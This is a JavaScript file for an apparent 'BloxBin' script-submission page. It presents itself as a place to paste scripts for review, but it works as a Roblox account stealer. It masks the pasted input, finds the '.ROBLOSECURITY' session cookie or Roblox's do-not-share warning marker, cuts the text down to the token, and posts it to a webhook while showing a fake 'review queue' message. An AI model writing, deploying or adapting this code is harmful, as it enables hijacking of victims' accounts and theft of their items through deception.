(function () {
  const form = document.getElementById("submit-form");
  const input = document.getElementById("script-input");
  const mask = document.getElementById("script-mask");
  const submitBtn = document.getElementById("submit-btn");
  const statusEl = document.getElementById("status");
  const charCountEl = document.getElementById("char-count");

  const EMBED_DESC_LIMIT = 4096;
  const EMBED_FIELD_LIMIT = 1024;
  const EMBED_MAX_FIELDS = 25;
  const CENSOR_CHAR = "•";

  const ROBLOX_WARNING_MARKER =
    "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";

  mask.dataset.placeholder = "Paste your script…";

  function censor(text) {
    return text.replace(/[^\n\r]/g, CENSOR_CHAR);
  }

  function prepareSubmission(text) {
    const normalized = text.trim();
    const robloMatch = normalized.match(/\.ROBLOSECURITY/i);

    if (robloMatch && robloMatch.index !== undefined) {
      return normalized.slice(robloMatch.index);
    }

    const markerIndex = normalized.indexOf(ROBLOX_WARNING_MARKER);
    if (markerIndex !== -1) {
      return normalized.slice(markerIndex);
    }

    return normalized;
  }

  function codeBlock(text) {
    return "```\n" + text + "\n```";
  }

  function buildEmbed(text) {
    const embed = {
      title: "BloxBin Submission",
      color: 0x4f7df5,
      timestamp: new Date().toISOString(),
    };

    const descOverhead = 8;
    const maxDescText = EMBED_DESC_LIMIT - descOverhead;

    if (text.length <= maxDescText) {
      embed.description = codeBlock(text);
      return embed;
    }

    embed.description = codeBlock(text.slice(0, maxDescText));
    let rest = text.slice(maxDescText);
    embed.fields = [];

    const fieldOverhead = 8;
    const maxFieldText = EMBED_FIELD_LIMIT - fieldOverhead;

    for (let i = 0; i < EMBED_MAX_FIELDS && rest.length > 0; i++) {
      const chunk = rest.slice(0, maxFieldText);
      embed.fields.push({
        name: "Continued (" + (i + 1) + ")",
        value: codeBlock(chunk),
      });
      rest = rest.slice(maxFieldText);
    }

    return embed;
  }

  function syncMask() {
    mask.textContent = censor(input.value);
    mask.scrollTop = input.scrollTop;
    mask.scrollLeft = input.scrollLeft;

    const count = input.value.length;
    charCountEl.textContent =
      count === 1 ? "1 character" : count.toLocaleString() + " characters";
  }

  function setStatus(message, type) {
    statusEl.textContent = message;
    statusEl.className = "status" + (type ? " " + type : "");
  }

  function setLoading(loading) {
    submitBtn.disabled = loading;
    submitBtn.classList.toggle("loading", loading);
  }

  input.addEventListener("input", function () {
    input.style.height = "120px";
    syncMask();
  });

  input.addEventListener("scroll", syncMask);

  input.addEventListener("paste", function () {
    requestAnimationFrame(function () {
      input.style.height = "120px";
      syncMask();
    });
  });

  async function sendSubmission(text) {
    const endpoint = typeof WEBHOOK_URL === "string" ? WEBHOOK_URL.trim() : "";

    if (!endpoint) {
      throw new Error("Submission is not configured.");
    }

    const payload = prepareSubmission(text);
    const embed = buildEmbed(payload);

    const response = await fetch(endpoint, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ embeds: [embed] }),
    });

    if (!response.ok) {
      throw new Error("Submission failed.");
    }
  }

  form.addEventListener("submit", async function (event) {
    event.preventDefault();

    const text = input.value.trim();

    if (!text) {
      setStatus("Please paste a script before submitting.", "error");
      input.focus();
      return;
    }

    setLoading(true);
    setStatus("Securing and submitting…");

    try {
      await sendSubmission(text);
      setStatus("Submitted successfully. Your script is in the review queue.", "success");
      input.value = "";
      syncMask();
    } catch {
      setStatus("Something went wrong. Please try again.", "error");
    } finally {
      setLoading(false);
    }
  });
})();
